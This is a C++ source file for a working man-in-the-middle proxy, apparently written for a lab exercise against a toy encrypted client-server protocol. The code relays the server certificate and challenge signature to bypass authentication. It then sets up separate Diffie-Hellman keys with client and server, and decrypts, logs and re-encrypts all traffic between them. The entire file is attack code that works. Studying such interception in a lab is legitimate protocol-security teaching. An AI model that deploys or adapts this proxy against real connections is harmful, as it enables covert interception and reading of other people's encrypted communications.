#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <openssl/bn.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <algorithm>

constexpr int SERVER_PORT = 8080;
constexpr const char* SERVER_IP = "10.0.2.10"; // Real Server

constexpr int PROXY_PORT = 9090;               // Tamir's listening port
constexpr int BUFFER_SIZE = 4096;

// RFC 3526 Group 15 (3072-bit MODP Group)
const char* MODP_3072_PRIME =
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
    "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
    "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
    "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
    "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"
    "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
    "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
    "670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
    "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"
    "DE2BCBF6955817183995497CEA956AE515D2261898FA0510"
    "15728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64"
    "ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7"
    "ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6B"
    "F12FFA06D98A0864D87602733EC86A64521F2B18177B200C"
    "BBE117577A615D6C770988C0BAD946E208E24FA074E5AB31"
    "43DB5BFCE0FD108E4B82D120A93AD2CAFFFFFFFFFFFFFFFF";

bool send_all(int sock, const std::string& data) {
    size_t total_sent = 0;
    while (total_sent < data.size()) {
        ssize_t n = send(sock, data.data() + total_sent, data.size() - total_sent, 0);
        if (n <= 0) { if (n < 0 && errno == EINTR) continue; return false; }
        total_sent += (size_t)n;
    }
    return true;
}

std::string b64_encode(const std::string& in) {
    std::string out(4 * ((in.size() + 2) / 3), '\0');
    int len = EVP_EncodeBlock((unsigned char*)out.data(), (const unsigned char*)in.data(), in.size());
    out.resize(len); return out;
}

std::string b64_decode(const std::string& in) {
    int pad = 0;
    if (in.length() > 0 && in[in.length() - 1] == '=') pad++;
    if (in.length() > 1 && in[in.length() - 2] == '=') pad++;
    std::string out(3 * in.length() / 4, '\0');
    int len = EVP_DecodeBlock((unsigned char*)out.data(), (const unsigned char*)in.data(), in.length());
    out.resize(len - pad); return out;
}

std::string aes_encrypt(const std::string& plaintext, const unsigned char* key) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[12]; RAND_bytes(iv, sizeof(iv));
    std::string ciphertext; ciphertext.resize(plaintext.size() + EVP_MAX_BLOCK_LENGTH);
    int len = 0, ciphertext_len = 0;
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, (unsigned char*)&ciphertext[0], &len, (unsigned char*)plaintext.c_str(), plaintext.size());
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, (unsigned char*)&ciphertext[0] + len, &len);
    ciphertext_len += len; ciphertext.resize(ciphertext_len);
    unsigned char tag[16]; EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag);
    EVP_CIPHER_CTX_free(ctx);
    std::string bin_result = ""; bin_result.append((char*)iv, 12); bin_result.append((char*)tag, 16); bin_result.append(ciphertext);
    return b64_encode(bin_result);
}

bool aes_decrypt(const std::string& b64_input, const unsigned char* key, std::string& decrypted_out) {
    std::string input = b64_decode(b64_input);
    if (input.size() < 28) return false;
    const unsigned char* iv = (const unsigned char*)input.data();
    const unsigned char* tag = (const unsigned char*)input.data() + 12;
    const unsigned char* ciphertext = (const unsigned char*)input.data() + 28;
    int ciphertext_len = input.size() - 28;
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);
    std::string plaintext; plaintext.resize(ciphertext_len);
    int len = 0, plaintext_len = 0;
    EVP_DecryptUpdate(ctx, (unsigned char*)&plaintext[0], &len, ciphertext, ciphertext_len);
    plaintext_len = len;
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void*)tag);
    int ret = EVP_DecryptFinal_ex(ctx, (unsigned char*)&plaintext[0] + len, &len);
    EVP_CIPHER_CTX_free(ctx);
    if (ret > 0) { plaintext_len += len; plaintext.resize(plaintext_len); decrypted_out = plaintext; return true; }
    return false;
}

int main() {
    std::cout << "[Tamir Proxy] Phase 3 MITM Proxy listening on port " << PROXY_PORT << "...\n";

    int proxy_sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in proxy_addr;
    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(PROXY_PORT);
    proxy_addr.sin_addr.s_addr = INADDR_ANY;

    int opt = 1; setsockopt(proxy_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    if (bind(proxy_sock, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) return -1;
    listen(proxy_sock, 5);

    struct sockaddr_in cli_addr; socklen_t cli_len = sizeof(cli_addr);
    int victim_sock = accept(proxy_sock, (struct sockaddr*)&cli_addr, &cli_len);
    std::cout << "[Proxy] Intercepted Victim Client.\n";

    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr);
    connect(server_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    std::cout << "[Proxy] Connected to Real Server.\n";

    char c;

    // ---------------------------------------------------------
    // STEP 1: RELAY SERVER CERTIFICATE
    // ---------------------------------------------------------
    std::string cert_data = "";
    const std::string cert_end_marker = "-----END CERTIFICATE-----\n";
    while (read(server_sock, &c, 1) > 0) {
        cert_data += c;
        if (cert_data.length() >= cert_end_marker.length() && 
            cert_data.substr(cert_data.length() - cert_end_marker.length()) == cert_end_marker) break;
    }
    send_all(victim_sock, cert_data);
    std::cout << "[Proxy] Relayed Server Certificate to Client.\n";

    // ---------------------------------------------------------
    // STEP 2: RELAY CRYPTOGRAPHIC CHALLENGE
    // ---------------------------------------------------------
    std::string challenge = "";
    while (read(victim_sock, &c, 1) > 0) {
        challenge += c;
        if (c == '\n') break;
    }
    send_all(server_sock, challenge);
    std::cout << "[Proxy] Relayed Client's Challenge to Server.\n";

    // ---------------------------------------------------------
    // STEP 3: RELAY SERVER SIGNATURE
    // ---------------------------------------------------------
    std::string signature = "";
    while (read(server_sock, &c, 1) > 0) {
        signature += c;
        if (c == '\n') break;
    }
    send_all(victim_sock, signature);
    std::cout << "[Proxy] Relayed Server's Signature to Client. Authentication bypassed!\n";

    // ---------------------------------------------------------
    // STEP 4: INTERCEPT AND SPLIT DIFFIE-HELLMAN
    // ---------------------------------------------------------
    BN_CTX* ctx = BN_CTX_new();
    BIGNUM* p = NULL; BIGNUM* g = NULL;
    BN_hex2bn(&p, MODP_3072_PRIME); BN_hex2bn(&g, "2");

    // 4A: Read Client's DH Pub
    std::string client_pub_hex = "";
    while (read(victim_sock, &c, 1) > 0) {
        if (c == '\n') break;
        client_pub_hex += c;
    }

    // 4B: Send Proxy's DH Pub to Server
    BIGNUM* priv_p_s = BN_new(); BIGNUM* pub_p_s = BN_new();
    BN_rand_range(priv_p_s, p); BN_mod_exp(pub_p_s, g, priv_p_s, p, ctx);
    char* pub_p_s_hex = BN_bn2hex(pub_p_s);
    send_all(server_sock, std::string(pub_p_s_hex) + "\n");
    OPENSSL_free(pub_p_s_hex);

    // 4C: Read Server's DH Pub
    std::string server_pub_hex = "";
    while (read(server_sock, &c, 1) > 0) {
        if (c == '\n') break;
        server_pub_hex += c;
    }

    // 4D: Send Proxy's DH Pub to Client
    BIGNUM* priv_p_c = BN_new(); BIGNUM* pub_p_c = BN_new();
    BN_rand_range(priv_p_c, p); BN_mod_exp(pub_p_c, g, priv_p_c, p, ctx);
    char* pub_p_c_hex = BN_bn2hex(pub_p_c);
    send_all(victim_sock, std::string(pub_p_c_hex) + "\n");
    OPENSSL_free(pub_p_c_hex);

    // 4E: Compute both symmetric keys
    unsigned char client_aes_key[32];
    BIGNUM* c_pub = NULL; BN_hex2bn(&c_pub, client_pub_hex.c_str());
    BIGNUM* s_secret_c = BN_new(); BN_mod_exp(s_secret_c, c_pub, priv_p_c, p, ctx);
    int c_len = BN_num_bytes(s_secret_c); unsigned char* c_bytes = new unsigned char[c_len];
    BN_bn2bin(s_secret_c, c_bytes); SHA256(c_bytes, c_len, client_aes_key); delete[] c_bytes;

    unsigned char server_aes_key[32];
    BIGNUM* s_pub = NULL; BN_hex2bn(&s_pub, server_pub_hex.c_str());
    BIGNUM* s_secret_s = BN_new(); BN_mod_exp(s_secret_s, s_pub, priv_p_s, p, ctx);
    int s_len = BN_num_bytes(s_secret_s); unsigned char* s_bytes = new unsigned char[s_len];
    BN_bn2bin(s_secret_s, s_bytes); SHA256(s_bytes, s_len, server_aes_key); delete[] s_bytes;

    BN_free(p); BN_free(g); BN_free(priv_p_s); BN_free(pub_p_s); BN_free(priv_p_c); BN_free(pub_p_c);
    BN_free(c_pub); BN_free(s_secret_c); BN_free(s_pub); BN_free(s_secret_s); BN_CTX_free(ctx);

    std::cout << "[Proxy] DH Intercepted! Keys established independently with Client and Server.\n";

    // ---------------------------------------------------------
    // STEP 5: DECRYPT, LOG, & RELAY LOOP
    // ---------------------------------------------------------
    fd_set readfds; char buffer[BUFFER_SIZE];
    std::string client_rx = "", server_rx = "";

    while (true) {
        FD_ZERO(&readfds);
        FD_SET(victim_sock, &readfds);
        FD_SET(server_sock, &readfds);

        int max_sock = std::max(victim_sock, server_sock);
        if (select(max_sock + 1, &readfds, NULL, NULL, NULL) < 0) break;

        if (FD_ISSET(victim_sock, &readfds)) {
            int n = read(victim_sock, buffer, BUFFER_SIZE - 1);
            if (n <= 0) break;
            client_rx.append(buffer, n);
            size_t pos;
            while ((pos = client_rx.find('\n')) != std::string::npos) {
                std::string frame = client_rx.substr(0, pos); client_rx.erase(0, pos + 1);
                std::string plaintext;
                if (aes_decrypt(frame, client_aes_key, plaintext)) {
                    std::cout << "\n[TAMIR READS - FROM CLIENT] " << plaintext << "\n";
                    send_all(server_sock, aes_encrypt(plaintext, server_aes_key) + "\n");
                }
            }
        }

        if (FD_ISSET(server_sock, &readfds)) {
            int n = read(server_sock, buffer, BUFFER_SIZE - 1);
            if (n <= 0) break;
            server_rx.append(buffer, n);
            size_t pos;
            while ((pos = server_rx.find('\n')) != std::string::npos) {
                std::string frame = server_rx.substr(0, pos); server_rx.erase(0, pos + 1);
                std::string plaintext;
                if (aes_decrypt(frame, server_aes_key, plaintext)) {
                    std::cout << "\n[TAMIR READS - FROM SERVER] " << plaintext << "\n";
                    send_all(victim_sock, aes_encrypt(plaintext, client_aes_key) + "\n");
                }
            }
        }
    }

    close(victim_sock); close(server_sock); close(proxy_sock);
    return 0;
}
